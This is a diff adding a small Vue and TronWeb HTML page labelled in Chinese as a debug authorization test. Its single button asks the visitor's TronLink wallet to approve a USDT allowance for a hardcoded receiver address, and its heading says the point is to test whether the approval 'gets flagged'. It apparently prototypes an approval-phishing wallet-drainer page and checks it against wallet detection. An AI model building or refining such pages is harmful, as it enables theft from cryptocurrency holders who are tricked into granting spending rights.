@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>测试授权页面（调试版）</title>
+  <script src="https://cdn.jsdelivr.net/npm/vue@3.2.47/dist/vue.global.prod.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f0f0f0; }
+    h1 { font-size: 1.5rem; text-align: center; }
+    button { width: 100%; padding: 15px; font-size: 1rem; margin-top: 20px; border: none; border-radius: 8px; background: #4CAF50; color: white; }
+    pre { background: #fff; padding: 10px; margin-top: 20px; border-radius: 8px; font-size: 0.85rem; overflow-x: auto; }
+    .container { max-width: 600px; margin: auto; }
+  </style>
+</head>
+<body>
+  <div id="app" class="container">
+    <h1>授权调试：转账1USDT测试是否被标记</h1>
+    <button @click="authorizeTransfer">测试授权（调试）</button>
+    <pre v-if="error">{{ error }}</pre>
+  </div>
+
+  <script>
+    const { createApp } = Vue;
+    const receiverAddress = "TQfrsE1L52PCKq9YWyU3cvFF19xu5EPPsP";
+    const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+
+    createApp({
+      data() {
+        return {
+          error: null
+        };
+      },
+      methods: {
+        async authorizeTransfer() {
+          this.error = null;
+          if (!window.tronWeb || !window.tronWeb.ready) {
+            this.error = "未检测到 TronLink 或钱包未连接";
+            return;
+          }
+          const tronWeb = window.tronWeb;
+          try {
+            const contract = await tronWeb.contract().at(usdtContract);
+            await contract.approve(receiverAddress, tronWeb.toSun(1)).send();
+            alert("授权成功：已授权 1 USDT");
+          } catch (err) {
+            console.error(err);
+            this.error = "授权失败：\n" + (err?.message || JSON.stringify(err, null, 2));
+          }
+        }
+      }
+    }).mount('#app');
+  </script>
+</body>
+</html>
